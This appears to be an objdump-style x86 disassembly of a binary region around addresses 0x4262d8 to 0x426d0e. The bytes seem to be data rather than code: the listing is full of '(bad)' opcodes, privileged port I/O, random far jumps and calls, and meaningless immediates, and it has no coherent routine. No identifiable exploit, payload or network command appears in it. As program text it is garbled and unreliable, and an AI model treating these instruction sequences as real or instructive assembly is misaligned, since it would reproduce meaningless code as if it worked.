  4262d8:	lods   al,BYTE PTR ds:[esi]
  4262d9:	fmul   QWORD PTR [edi]
  4262db:	in     al,0x31
  4262dd:	or     DWORD PTR [edi+0x4b],ebx
  4262e0:	mov    al,al
  4262e2:	ret    0x30da
  4262e5:	jae    0x426279
  4262e7:	dec    ecx
  4262e8:	aaa    
  4262e9:	cmp    eax,0xa4550c17
  4262ee:	(bad)  
  4262ef:	dec    edx
  4262f0:	inc    esp
  4262f1:	jmp    0xb902:0xd1717b8
  4262f8:	or     eax,0x3837139b
  4262fd:	lock lahf 
  4262ff:	js     0x4262e7
  426301:	popa   
  426302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426303:	mov    cl,0x68
  426305:	retf   
  426306:	arpl   WORD PTR [edx+0x23],dx
  426309:	xchg   edx,eax
  42630a:	aas    
  42630b:	jb     0x4262f8
  42630d:	jmp    0x426380
  42630f:	rol    DWORD PTR [eax],1
	...
  426371:	add    BYTE PTR [eax],al
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xdc39b670
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    dh,al
  42638d:	(bad)  
  42638e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42638f:	inc    esi
  426390:	add    BYTE PTR [ecx+0x55],dh
  426393:	loopne 0x426409
  426395:	dec    edi
  426396:	mov    BYTE PTR [esi+edx*1],bl
  426399:	push   esp
  42639a:	int    0x3a
  42639c:	adc    al,0xf4
  42639e:	outs   dx,BYTE PTR ds:[esi]
  42639f:	icebp  
  4263a0:	inc    ebp
  4263a1:	pop    eax
  4263a2:	and    DWORD PTR [ebx],0x78
  4263a5:	push   ecx
  4263a6:	fs ins BYTE PTR es:[edi],dx
  4263a8:	loopne 0x426330
  4263aa:	adc    ah,BYTE PTR [ecx+0x149dfdc2]
  4263b0:	pusha  
  4263b1:	mov    edi,0x692920eb
  4263b6:	outs   dx,BYTE PTR ds:[esi]
  4263b7:	push   cs
  4263b8:	xchg   edx,eax
  4263b9:	fwait
  4263ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263bb:	fisttp WORD PTR [ecx-0x4e4280ec]
  4263c1:	sub    BYTE PTR [esi+0x22871cbc],al
  4263c7:	and    bl,al
  4263c9:	xchg   esp,eax
  4263ca:	es pop edx
  4263cc:	or     ebp,ecx
  4263ce:	or     edi,ebx
  4263d0:	lods   al,BYTE PTR ds:[esi]
  4263d1:	iret   
  4263d2:	test   al,0x51
  4263d4:	add    esp,DWORD PTR [ecx-0x6c0fd25d]
  4263da:	push   ss
  4263db:	in     eax,0xf5
  4263dd:	sbb    eax,0x2c6d37be
  4263e2:	test   eax,0x400c6f2f
  4263e7:	jle    0x4263b6
  4263e9:	lods   eax,DWORD PTR ds:[esi]
  4263ea:	fstp   DWORD PTR [edx+0x6f62bcc9]
  4263f0:	addr16 popfw 
  4263f3:	xchg   esi,eax
  4263f4:	bnd js 0x4263f2
  4263f7:	xor    eax,0x1be85419
  4263fc:	scas   al,BYTE PTR es:[edi]
  4263fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263fe:	fwait
  4263ff:	sub    al,0x83
  426401:	out    dx,eax
  426402:	mov    bl,0x71
  426404:	test   al,0xb
  426406:	adc    DWORD PTR [edx+0x1bf5c908],ebx
  42640c:	shl    BYTE PTR [ebp+0x61600c17],cl
  426412:	sahf   
  426413:	hlt    
  426414:	xchg   esi,eax
  426415:	dec    esi
  426416:	in     eax,0x38
  426418:	(bad)  
  426419:	popf   
  42641a:	outs   dx,BYTE PTR ds:[esi]
  42641b:	test   al,0x64
  42641d:	xchg   esi,eax
  42641e:	sar    DWORD PTR [edi],cl
  426420:	sub    DWORD PTR ss:[ecx],0xbd256b5a
  426427:	in     al,0x80
  426429:	gs xchg esp,eax
  42642b:	mov    WORD PTR [ecx+edi*2-0x65387b1d],?
  426432:	mul    dh
  426434:	or     esp,esi
  426436:	xchg   ebp,eax
  426437:	aas    
  426438:	(bad)  
  426439:	in     eax,dx
  42643a:	add    BYTE PTR [ecx-0x3e],al
  42643d:	jg     0x4264b6
  42643f:	cmp    eax,0x257d321b
  426444:	cmp    DWORD PTR [ebp+0x40d9e685],esp
  42644a:	fwait
  42644b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42644c:	mov    ds:0x54e07b45,eax
  426451:	or     BYTE PTR [edi],dl
  426453:	jg     0x426490
  426455:	iret   
  426456:	xchg   ebp,eax
  426457:	popa   
  426458:	ret    
  426459:	and    DWORD PTR [ebp+ebp*1-0x4f86701c],eax
  426460:	jle    0x42649d
  426462:	aad    0x64
  426464:	push   ds
  426465:	pop    ecx
  426466:	das    
  426467:	mov    esi,0xc5f7aa06
  42646c:	or     cl,bl
  42646e:	push   ebx
  42646f:	xor    eax,0xd1b3a4ff
  426474:	retf   0x893b
  426477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426478:	adc    dh,BYTE PTR [ebx+0x7d]
  42647b:	sbb    DWORD PTR [ebp-0x2a],0xffffff81
  42647f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426480:	jecxz  0x426474
  426482:	sub    al,0xc4
  426484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426486:	inc    edx
  426487:	jmp    0x4264af
  426489:	call   0xf266:0x6fda7e66
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x5062a97b]
  426503:	imul   ah
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	push   ds
  42650d:	cmp    ebp,DWORD PTR [edx+0x3f]
  426510:	sbb    eax,0x5030436e
  426515:	div    DWORD PTR [eax+ecx*1]
  426518:	and    edi,DWORD PTR [ecx-0x49ce807e]
  42651e:	call   0xb4a9:0x1d7dcc88
  426525:	xchg   ecx,eax
  426526:	fdiv   DWORD PTR [eax]
  426528:	in     eax,0x6f
  42652a:	lods   al,BYTE PTR ds:[esi]
  42652b:	xchg   edi,eax
  42652c:	inc    edx
  42652d:	ret    0xce68
  426530:	cld    
  426531:	and    bl,BYTE PTR [edi-0x776eebcc]
  426537:	rol    ch,cl
  426539:	(bad)  
  42653a:	and    esi,DWORD PTR [ebp+0x45808032]
  426540:	pop    edi
  426541:	bound  ecx,QWORD PTR [edi+0x1f]
  426544:	xchg   ebp,eax
  426545:	shl    BYTE PTR [ecx],0xbc
  426548:	push   0xffffffec
  42654a:	(bad)  
  42654b:	rcl    DWORD PTR [ecx+0x74a3c601],1
  426551:	popf   
  426552:	fnsave [esi-0x293bc8ac]
  426558:	cmp    DWORD PTR [esp+esi*1],esi
  42655b:	sub    edx,eax
  42655d:	mov    dl,0xaa
  42655f:	mov    ecx,0x7bb4e54f
  426564:	test   eax,0x15edfc97
  426569:	pop    edi
  42656a:	and    ebp,edi
  42656c:	xor    bl,al
  42656e:	loope  0x426521
  426570:	repnz mov DWORD PTR [ecx+0x2b],ecx
  426574:	cmp    edx,DWORD PTR [edi+0x5b]
  426577:	hlt    
  426578:	jae    0x42653f
  42657a:	mov    ch,0x3c
  42657c:	mov    eax,0x5d4739a1
  426581:	jp     0x426545
  426583:	fwait
  426584:	jnp    0x42652b
  426586:	inc    esp
  426587:	xor    DWORD PTR [edi-0x15],ecx
  42658a:	shl    DWORD PTR [edx],1
  42658c:	jae    0x426530
  42658e:	mov    al,0xf9
  426590:	sbb    eax,DWORD PTR [ebx+0x5d39f3f5]
  426596:	jbe    0x426578
  426598:	aaa    
  426599:	inc    edi
  42659a:	into   
  42659b:	mov    ds:0x7d37bc06,al
  4265a0:	adc    DWORD PTR ss:[ebx],0xa615e500
  4265a7:	outs   dx,DWORD PTR ds:[esi]
  4265a8:	pop    ebx
  4265a9:	sti    
  4265aa:	jmp    0x35e1:0x4c59c9b7
  4265b1:	add    ch,BYTE PTR [ecx-0x78]
  4265b4:	xchg   ebx,eax
  4265b5:	mov    bl,0xf1
  4265b7:	sahf   
  4265b8:	ss leave 
  4265ba:	cs push eax
  4265bc:	lock js 0x426569
  4265bf:	ret    0x73db
  4265c2:	shr    BYTE PTR [edi],0xd2
  4265c5:	jo     0x4265ef
  4265c7:	sub    eax,0xcde92106
  4265cc:	aam    0xc
  4265ce:	push   0xb3fbf524
  4265d3:	lods   eax,DWORD PTR ds:[esi]
  4265d4:	loopne 0x426565
  4265d6:	jp     0x42664e
  4265d8:	xchg   ecx,eax
  4265d9:	repz mov edx,0x9638f544
  4265df:	jo     0x42658b
  4265e1:	pop    edx
  4265e2:	jge    0x4265da
  4265e4:	jo     0x42660a
  4265e6:	and    eax,0x75872cd9
  4265eb:	hlt    
  4265ec:	xchg   al,ah
  4265ee:	aad    0xab
  4265f0:	mov    ebx,0x33d90639
  4265f5:	push   ecx
  4265f6:	jmp    0x7a238cca
  4265fb:	inc    DWORD PTR [ebp-0x12]
  4265fe:	inc    ebx
  4265ff:	push   0x7d
  426601:	sub    eax,DWORD PTR [edi-0x16]
  426604:	sub    ebp,DWORD PTR [edx]
  426606:	in     eax,0x48
  426608:	dec    eax
  426609:	addr16 retf 
  42660b:	shr    BYTE PTR [eax+eiz*1+0x6bf2],1
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x77756da4]
  426682:	or     eax,0x199f042
  426687:	add    BYTE PTR [ecx+eax*1],al
  42668a:	add    BYTE PTR [eax],al
  42668c:	(bad)  
  42668f:	icebp  
  426690:	fst    DWORD PTR [edi-0x1b]
  426693:	call   0xee37:0x405d78c9
  42669a:	bound  eax,QWORD PTR [edi]
  42669c:	xor    BYTE PTR [edx],ah
  42669e:	cmc    
  42669f:	lods   al,BYTE PTR ds:[esi]
  4266a0:	dec    esp
  4266a1:	out    0x10,al
  4266a3:	jg     0x42667d
  4266a5:	outs   dx,DWORD PTR ds:[esi]
  4266a6:	dec    eax
  4266a7:	addr16 dec eax
  4266a9:	xchg   edi,eax
  4266aa:	jbe    0x4266df
  4266ac:	jmp    0xaf490944
  4266b1:	jp     0x4266c5
  4266b3:	mov    cl,0xf6
  4266b5:	add    al,BYTE PTR [edx]
  4266b7:	inc    ebx
  4266b8:	call   0x4f3a:0xd9786613
  4266bf:	data16 je 0x426701
  4266c2:	dec    ebx
  4266c3:	repnz lods eax,DWORD PTR ds:[esi]
  4266c5:	(bad)  
  4266c6:	shr    DWORD PTR [ebp+ebx*2+0x6e],cl
  4266ca:	(bad)  
  4266cb:	ins    DWORD PTR es:[edi],dx
  4266cc:	and    BYTE PTR [esi-0x3d111faf],dh
  4266d2:	dec    ecx
  4266d3:	and    al,0xc9
  4266d5:	mov    edi,0x2b4311ce
  4266da:	cmp    BYTE PTR [ebx-0x36],bh
  4266dd:	inc    edi
  4266de:	aam    0x5b
  4266e0:	scas   al,BYTE PTR es:[edi]
  4266e1:	pop    ds
  4266e2:	enter  0x40c7,0xb6
  4266e6:	adc    BYTE PTR [esi],cl
  4266e8:	retf   0x9126
  4266eb:	stos   DWORD PTR es:[edi],eax
  4266ec:	dec    ebp
  4266ed:	cwde   
  4266ee:	xor    dh,ch
  4266f0:	push   esp
  4266f1:	inc    edi
  4266f2:	dec    edx
  4266f3:	call   FWORD PTR [edx]
  4266f5:	push   ebx
  4266f6:	sbb    eax,0x426231d
  4266fb:	mov    ah,0xff
  4266fd:	fwait
  4266fe:	popf   
  4266ff:	test   DWORD PTR [esi+0x5e],ecx
  426702:	push   ss
  426703:	in     al,dx
  426704:	daa    
  426705:	adc    ecx,ebx
  426707:	fidiv  WORD PTR [edi+0x404085aa]
  42670d:	push   ebx
  42670e:	clc    
  42670f:	or     al,0x87
  426711:	mov    DWORD PTR [eax],ebp
  426713:	mov    edx,0x8dd8c6fc
  426718:	test   eax,0x2ed488ee
  42671d:	jae    0x4266b7
  42671f:	leave  
  426720:	(bad)  [esi+0x3e0ddee1]
  426726:	pop    es
  426727:	mov    edx,ebp
  426729:	imul   edx,esp,0x5112772f
  42672f:	push   edi
  426730:	xchg   edi,eax
  426731:	mov    edx,esi
  426733:	xchg   DWORD PTR [eax+0x5cfa05d3],esi
  426739:	aas    
  42673a:	repnz sbb BYTE PTR [eax],al
  42673d:	sub    eax,0x172ec0de
  426742:	mov    ecx,0x7e12a6b0
  426747:	mov    ebp,0x82382ff3
  42674c:	push   ss
  42674d:	ficom  WORD PTR [edi+0x3cbadeb8]
  426753:	push   edi
  426754:	add    bl,BYTE PTR [eax-0x43]
  426757:	mov    gs,WORD PTR [edx]
  426759:	or     esp,DWORD PTR [eax]
  42675b:	xor    eax,0x1296c37d
  426760:	imul   edi,DWORD PTR [esi],0x5
  426763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426764:	jo     0x4267a0
  426766:	mov    BYTE PTR [eax+0x68],ah
  426769:	xor    bh,BYTE PTR [bx]
  42676c:	les    ebx,FWORD PTR [esi+eax*8-0x32]
  426770:	mov    esi,0x2fe63f0d
  426775:	xlat   BYTE PTR ds:[ebx]
  426776:	pop    edi
  426777:	les    ecx,FWORD PTR [eax]
  426779:	nop
  42677a:	test   DWORD PTR [esi-0x52e49b84],edx
  426780:	rcl    BYTE PTR [edi+edx*8],cl
  426783:	int    0x19
  426785:	pushf  
  426786:	adc    DWORD PTR [esi+eax*8],ecx
  426789:	sbb    eax,0x51b4640d
  42678e:	bnd jmp 0x426794
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	minps  xmm6,XMMWORD PTR ds:0x19af4dd
  426807:	add    BYTE PTR [ecx+eax*1],al
  42680a:	add    BYTE PTR [eax],al
  42680c:	inc    eax
  42680d:	and    DWORD PTR [edi+0xb547a50],esp
  426813:	pop    ds
  426814:	push   ecx
  426815:	fcomp  QWORD PTR [ecx+eax*4-0x168f1d56]
  42681c:	ds sti 
  42681e:	jns    0x4267e0
  426820:	dec    ebp
  426821:	sbb    edx,ecx
  426823:	ss pop ecx
  426825:	add    BYTE PTR [edi],ah
  426827:	int    0xc9
  426829:	outs   dx,DWORD PTR ds:[esi]
  42682a:	jne    0x426866
  42682c:	hlt    
  42682d:	xchg   edx,eax
  42682e:	adc    edi,DWORD PTR [ebp+ecx*2+0x19393534]
  426835:	mov    eax,ds:0x2979dc32
  42683a:	pop    eax
  42683b:	cwde   
  42683c:	fisttp WORD PTR [edx-0x2e75d3d2]
  426842:	jp     0x4267f3
  426844:	lods   eax,DWORD PTR ds:[esi]
  426845:	aam    0xe1
  426847:	aam    0xa4
  426849:	cli    
  42684a:	or     BYTE PTR [eax-0x4aabb033],bl
  426850:	dec    eax
  426851:	dec    edx
  426852:	mov    eax,ds:0x69c3a0f2
  426857:	cld    
  426858:	or     al,0x52
  42685a:	jb     0x426854
  42685c:	pop    edi
  42685d:	add    esp,DWORD PTR [ebx+0x49]
  426860:	dec    esi
  426861:	ret    0x9f80
  426864:	mov    edi,0xe57e594c
  426869:	and    BYTE PTR [eax-0x6e4b5c4a],dl
  42686f:	dec    esi
  426870:	push   edi
  426871:	outs   dx,BYTE PTR ds:[esi]
  426872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426873:	xchg   BYTE PTR [edx],ch
  426875:	test   al,0xb
  426877:	inc    eax
  426878:	enter  0xec1e,0xc3
  42687c:	mov    dl,0x1f
  42687f:	inc    esi
  426880:	std    
  426881:	or     cl,dl
  426883:	lds    esi,FWORD PTR [ebx+eiz*1-0x60]
  426887:	push   ebx
  426888:	mov    ch,0xd0
  42688a:	loopne 0x4268f7
  42688c:	push   esp
  42688d:	test   DWORD PTR [edx],esp
  42688f:	test   DWORD PTR [edi],edi
  426891:	or     BYTE PTR [edi],ch
  426893:	int3   
  426894:	imul   ecx,DWORD PTR [esi-0x34],0xfb01ab24
  42689b:	lds    eax,FWORD PTR [ecx+0x39]
  42689e:	and    BYTE PTR [edi],bl
  4268a0:	and    al,0x26
  4268a2:	ss pop ebp
  4268a4:	push   eax
  4268a5:	fdivp  st(6),st
  4268a7:	and    BYTE PTR [ecx],ch
  4268a9:	add    al,bh
  4268ab:	mov    bh,0xc2
  4268ad:	adc    ah,bh
  4268af:	mov    ebp,0xd8e0226d
  4268b4:	(bad)  [ecx+0x15]
  4268b7:	xchg   ebp,eax
  4268b8:	cld    
  4268b9:	push   es
  4268ba:	pop    esi
  4268bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268bc:	and    eax,0x99b88d82
  4268c1:	sbb    BYTE PTR [ebp+0x3e],cl
  4268c4:	xchg   bl,al
  4268c6:	in     al,dx
  4268c7:	inc    ebx
  4268c8:	sub    edi,DWORD PTR [esi+0x490f5bd7]
  4268ce:	or     DWORD PTR [eax+0x22],eax
  4268d1:	mov    dh,0xe0
  4268d3:	and    al,0x70
  4268d5:	xchg   edx,eax
  4268d6:	js     0x426945
  4268d8:	loop   0x4268bf
  4268da:	cmp    ebp,DWORD PTR [edx]
  4268dc:	push   ds
  4268dd:	std    
  4268de:	pop    ds
  4268df:	cmp    BYTE PTR [edi+0x79],0x93
  4268e3:	mov    edi,0x916fc226
  4268e8:	mov    bl,0xd
  4268ea:	(bad)  [esi]
  4268ec:	push   ebx
  4268ed:	push   ds
  4268ee:	pop    esp
  4268ef:	imul   eax,DWORD PTR [ebx-0x47de9653],0xd97ffd56
  4268f9:	ret    
  4268fa:	mov    ch,0x43
  4268fc:	aad    0xf6
  4268fe:	arpl   cx,di
  426900:	cmp    DWORD PTR [ebx],edx
  426902:	pop    ss
  426903:	lds    edx,FWORD PTR [esi+0xa]
  426906:	mov    bh,0xc5
  426908:	aam    0xfe
  42690a:	popa   
  42690b:	test   BYTE PTR [ebx+0x84f3c5],0x0
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ecx,DWORD PTR [esi]
  426981:	out    0x47,al
  426983:	mov    edi,0x19bf8
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	and    esp,esi
  42698e:	out    dx,al
  42698f:	push   eax
  426990:	loop   0x4269d6
  426992:	fld    st(3)
  426994:	pop    ecx
  426995:	add    al,0x8d
  426997:	stc    
  426998:	(bad)  
  426999:	push   ss
  42699a:	icebp  
  42699b:	dec    ecx
  42699c:	inc    ebp
  42699d:	mov    esp,0x22de1869
  4269a2:	pop    ss
  4269a3:	pop    esp
  4269a4:	stos   BYTE PTR es:[edi],al
  4269a5:	test   BYTE PTR [ebp+0x6c],ch
  4269a8:	lock dec edi
  4269aa:	je     0x426a1b
  4269ac:	leave  
  4269ad:	rol    BYTE PTR [edx],1
  4269af:	sub    ch,BYTE PTR [esi-0x2]
  4269b2:	imul   esp,DWORD PTR [edx+ebx*4-0xe],0xffffffd0
  4269b7:	xchg   esi,eax
  4269b8:	and    dh,dl
  4269ba:	call   FWORD PTR [edx-0x6d]
  4269bd:	and    BYTE PTR [esi+eiz*4+0x48104ffc],dh
  4269c4:	cwde   
  4269c5:	dec    ebx
  4269c6:	neg    DWORD PTR [ebx]
  4269c8:	sbb    DWORD PTR [ebp+0x1a69c1e8],ecx
  4269ce:	mov    edx,0x98a6ac17
  4269d3:	mov    eax,0xa83c0945
  4269d8:	(bad)  
  4269d9:	jl     0x4269ed
  4269db:	or     eax,0x5de9f55e
  4269e0:	lods   eax,DWORD PTR ds:[esi]
  4269e1:	pusha  
  4269e2:	jge    0x4269f9
  4269e4:	and    ebx,DWORD PTR [ebx]
  4269e6:	mov    eax,ds:0x5419b29d
  4269eb:	adc    DWORD PTR [ebx+0x4b2e2914],edx
  4269f1:	ins    BYTE PTR es:[edi],dx
  4269f2:	les    ebx,FWORD PTR [edi]
  4269f4:	in     eax,dx
  4269f5:	mov    dl,0x44
  4269f7:	je     0x426a68
  4269f9:	ret    
  4269fa:	imul   ecx,DWORD PTR [eax+0x43],0xc66f197b
  426a01:	cmc    
  426a02:	rcl    DWORD PTR [ebx+eiz*1+0x23],0xe5
  426a07:	iret   
  426a08:	imul   cl
  426a0a:	stos   BYTE PTR es:[edi],al
  426a0b:	mov    WORD PTR [edx],ss
  426a0d:	sti    
  426a0e:	test   eax,0x5f29d3cd
  426a13:	jp     0x4269ec
  426a15:	popf   
  426a16:	adc    ebp,DWORD PTR gs:[ecx+0x5c6646eb]
  426a1d:	cmp    dh,BYTE PTR [ebp+0x464fc822]
  426a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a24:	inc    edi
  426a25:	fnstsw WORD PTR [ebp+0x54]
  426a28:	add    ah,al
  426a2a:	mov    dl,0xae
  426a2c:	cmp    cl,ch
  426a2e:	dec    sp
  426a30:	mov    ah,0xdb
  426a32:	out    0xf1,al
  426a34:	out    0x66,eax
  426a36:	jmp    0xbe85e646
  426a3b:	sbb    DWORD PTR [eax-0x4c019929],ebp
  426a41:	jp     0x426a82
  426a43:	outs   dx,DWORD PTR ss:[esi]
  426a45:	cwde   
  426a46:	mov    ah,0x15
  426a48:	popf   
  426a49:	imul   eax,ebp,0xffffff81
  426a4c:	mov    BYTE PTR [ecx],dh
  426a4e:	mov    bh,0x41
  426a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a51:	leave  
  426a52:	dec    ebx
  426a53:	mov    ecx,0xfc22a426
  426a58:	or     BYTE PTR [eax],0xbb
  426a5b:	mov    es,ebp
  426a5d:	(bad)  [edx+0x73c69bac]
  426a63:	iret   
  426a64:	outs   dx,DWORD PTR ds:[esi]
  426a65:	sub    al,0x6b
  426a67:	pushf  
  426a68:	push   eax
  426a69:	jp     0x426ac3
  426a6b:	and    al,0xbe
  426a6d:	daa    
  426a6e:	or     ch,BYTE PTR [eax+0x30]
  426a71:	enter  0xc7ff,0xf3
  426a75:	cmp    eax,0xb1bf95a3
  426a7a:	push   cs
  426a7b:	xchg   BYTE PTR [edi+0x7],ch
  426a7e:	sub    DWORD PTR ds:0xd47f14dd,0xffffff8a
  426a85:	sbb    dh,bl
  426a87:	call   0x6848:0x2ec40c26
  426a8e:	push   0xb7
	...
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x5e
  426b01:	or     dl,dh
  426b03:	stc    
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	int    0x4c
  426b0e:	jecxz  0x426ace
  426b10:	sar    BYTE PTR ds:0xb9aeaeb8,1
  426b16:	in     al,dx
  426b17:	xchg   ecx,eax
  426b18:	add    DWORD PTR [eax+0x75],ebx
  426b1b:	pop    edx
  426b1c:	mov    ebx,0xe1937b6b
  426b21:	cs mov bh,0x5b
  426b24:	imul   ecx,DWORD PTR [edi+eiz*1],0xffffffdb
  426b28:	stos   DWORD PTR es:[edi],eax
  426b29:	pop    ds
  426b2a:	cmp    ch,BYTE PTR [edx]
  426b2c:	in     al,dx
  426b2d:	inc    esi
  426b2e:	les    eax,FWORD PTR [eax+0x33]
  426b31:	aas    
  426b32:	and    eax,DWORD PTR [edx-0x6f]
  426b35:	aaa    
  426b36:	xchg   esp,eax
  426b37:	cmp    eax,ebp
  426b39:	rcl    esi,cl
  426b3b:	cdq    
  426b3c:	xor    eax,0x644adef3
  426b41:	je     0x426b67
  426b43:	mov    ?,ebx
  426b45:	sar    ecx,0x1a
  426b48:	loop   0x426b8b
  426b4a:	scas   eax,DWORD PTR es:[edi]
  426b4b:	fsub   QWORD PTR [esi]
  426b4d:	rcr    DWORD PTR [edx-0x6acf92ac],0xa0
  426b54:	sbb    BYTE PTR [edx+0x40],cl
  426b57:	or     edi,DWORD PTR [esi-0x12]
  426b5a:	xlat   BYTE PTR ds:[ebx]
  426b5b:	inc    esi
  426b5c:	adc    dh,bh
  426b5e:	scas   eax,DWORD PTR es:[edi]
  426b5f:	sub    ah,BYTE PTR [ecx+0x76]
  426b62:	arpl   WORD PTR [esi+0x7a],dx
  426b65:	jne    0x426b66
  426b67:	dec    edx
  426b68:	jae    0x426af9
  426b6a:	jae    0x426b38
  426b6c:	or     eax,0x571b5071
  426b71:	ja     0x426bca
  426b73:	scas   al,BYTE PTR es:[edi]
  426b74:	xchg   esi,eax
  426b75:	aaa    
  426b76:	xchg   esp,eax
  426b77:	xchg   edx,eax
  426b78:	das    
  426b79:	in     eax,0x56
  426b7b:	arpl   WORD PTR [eax+ebx*8+0x6b],bx
  426b7f:	mov    ds:0x66908fd3,al
  426b84:	sbb    eax,DWORD PTR [esp+edx*1]
  426b87:	lahf   
  426b88:	push   edi
  426b89:	mov    ecx,0x45cfa3df
  426b8e:	or     eax,0xd6572d73
  426b93:	sbb    esp,edi
  426b95:	inc    eax
  426b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b97:	xchg   esp,eax
  426b98:	mov    WORD PTR [eax+0x48c4c11e],?
  426b9e:	fist   WORD PTR [ecx-0x2e]
  426ba1:	ins    DWORD PTR es:[edi],dx
  426ba2:	or     ah,BYTE PTR [ebx+0x45116de]
  426ba8:	(bad)  
  426baa:	cli    
  426bab:	sbb    ah,bh
  426bad:	dec    ebx
  426bae:	cmp    al,0x42
  426bb0:	jmp    0x63b3e19d
  426bb5:	int3   
  426bb6:	out    dx,eax
  426bb7:	pop    eax
  426bb8:	push   0x65a4a27
  426bbd:	inc    ecx
  426bbe:	push   ebx
  426bbf:	mov    ecx,0x42295097
  426bc4:	div    DWORD PTR [ecx]
  426bc6:	ret    
  426bc7:	dec    edi
  426bc8:	sub    BYTE PTR [ebx],dh
  426bca:	jbe    0x426be7
  426bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bcd:	add    dl,0xdb
  426bd0:	push   esp
  426bd1:	push   0x59afb219
  426bd6:	inc    ecx
  426bd7:	or     al,0x62
  426bd9:	add    bl,BYTE PTR [eax-0x6]
  426bdc:	sub    eax,DWORD PTR [ebp+ebx*8-0x32197136]
  426be3:	mov    bh,0x5b
  426be5:	(bad)  
  426be6:	and    esp,DWORD PTR [edx]
  426be8:	xchg   bx,ax
  426bea:	mov    ecx,0x5c0674af
  426bef:	je     0x426c1c
  426bf1:	into   
  426bf2:	ins    DWORD PTR es:[edi],dx
  426bf3:	lea    eax,[ebx-0x1dfb6184]
  426bf9:	sti    
  426bfa:	sbb    esi,esp
  426bfc:	inc    edi
  426bfd:	and    edi,DWORD PTR [edi+0x56]
  426c00:	(bad)  
  426c01:	mov    DWORD PTR [ebp+esi*2-0x49],ecx
  426c05:	fnstenv ds:0xb08762ba
  426c0b:	mov    WORD PTR [ebp-0x40],cs
  426c0e:	jmp    0x426ce2
	...
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xe7507ede
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	cmp    al,0x45
  426c8e:	sbb    DWORD PTR [edx+0x22],0x7f
  426c92:	sbb    eax,0xbc8d4fec
  426c97:	add    al,0x1d
  426c99:	and    DWORD PTR [ebx],edi
  426c9b:	pop    edx
  426c9c:	sbb    DWORD PTR [edx+0x3cd41de7],eax
  426ca2:	(bad)  
  426ca3:	sbb    ch,BYTE PTR [edx+0x37]
  426ca6:	xchg   DWORD PTR [ebp-0x167d89c6],edx
  426cac:	test   al,0x9
  426cae:	add    BYTE PTR [esi+eiz*2+0x37],ch
  426cb2:	sbb    BYTE PTR [edi],cl
  426cb4:	and    BYTE PTR [ebp+0xa7edc01],ah
  426cba:	dec    ecx
  426cbb:	fcmovnu st,st(0)
  426cbd:	fs sahf 
  426cbf:	inc    edi
  426cc0:	sahf   
  426cc1:	mov    ax,0x7e11
  426cc5:	test   al,0xb
  426cc7:	ins    BYTE PTR es:[edi],dx
  426cc8:	inc    ebx
  426cc9:	arpl   WORD PTR [edx-0x4f94a956],si
  426ccf:	test   eax,0x7f51b1be
  426cd4:	jg     0x426c81
  426cd6:	mov    ch,cl
  426cd8:	daa    
  426cd9:	retf   
  426cda:	lock inc edx
  426cdc:	in     al,0x6f
  426cde:	xchg   ebp,eax
  426cdf:	mov    eax,ds:0x54785c6e
  426ce4:	dec    edx
  426ce5:	or     edi,DWORD PTR [edi]
  426ce7:	es lahf 
  426ce9:	mov    cs,WORD PTR [ebp+0x7c9f490e]
  426cef:	sahf   
  426cf0:	pushf  
  426cf1:	push   0x1a510e2
  426cf6:	xchg   edi,eax
  426cf7:	int3   
  426cf8:	sub    ah,BYTE PTR [esi]
  426cfa:	jmp    0x9ba7b0c3
  426cff:	or     al,0xd0
  426d01:	mov    bh,0xb9
  426d03:	or     ecx,DWORD PTR [esi-0x4be88264]
  426d09:	sub    eax,0xfd86f916
  426d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
